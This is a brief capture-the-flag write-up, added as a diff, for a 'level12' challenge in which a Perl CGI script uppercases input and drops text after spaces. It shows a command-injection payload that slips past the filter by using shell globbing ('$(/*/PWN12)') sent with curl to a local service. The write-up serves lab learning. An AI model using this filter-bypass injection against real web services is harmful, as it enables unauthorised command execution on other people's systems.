@@ -1,0 +1,8 @@
+It seems that the perl script takes the arg x and turns it into uppercase and
+removes everything after a space.
+Merely executing a subshell won't work, let's exploit the shell's globbing capcities
+
+$ echo "getflag > /tmp/FLAG12" > /tmp/PWN12 
+$ chmod 777 /tmp/PWN12
+$ curl localhost:4646/level12.pl?x='$(/*/PWN12)'
+$ cat /tmp/FLAG12
